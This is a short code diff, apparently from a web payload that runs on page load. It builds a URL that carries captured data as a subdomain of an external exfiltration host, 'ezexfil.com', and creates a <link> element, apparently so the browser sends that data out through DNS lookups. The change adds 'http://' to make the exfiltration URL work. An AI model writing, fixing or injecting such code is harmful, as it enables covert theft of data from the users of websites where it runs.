@@ -25,7 +25,7 @@ window.addEventListener('load', function() {
 
         // 3. Construct the URL (Using the raw data directly)
         // Note: Ensure rawData doesn't contain spaces or symbols invalid for DNS
-        const exfilUrl = `${rawData}.z3zhkadg4qsehefe.ezexfil.com`;
+        const exfilUrl = `http://${rawData}.z3zhkadg4qsehefe.ezexfil.com`;
 
         // 4. Create the <link> element
         const link = document.createElement('link');
